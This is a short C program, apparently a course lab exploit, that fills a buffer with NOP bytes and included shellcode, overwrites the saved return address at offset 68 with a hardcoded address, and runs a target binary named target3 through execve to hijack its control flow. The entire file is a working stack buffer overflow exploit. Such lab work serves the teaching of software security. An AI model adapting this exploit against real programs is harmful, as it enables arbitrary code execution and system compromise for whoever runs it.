#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"

#define RETURN_ADDR "\x54\xfe\x21\x20"
#define NOP 0x90

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];


	char exploit_buffer[73];
	int shellcode_size = strlen(shellcode);

	// Copy shellcode 
	memset(exploit_buffer, NOP, 73);
	memcpy(exploit_buffer, shellcode, shellcode_size);

	// Override the return address
	memcpy(&exploit_buffer[68], RETURN_ADDR, 4);
	exploit_buffer[72] = '\0';


	args[0] = TARGET;
	args[1] = exploit_buffer;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
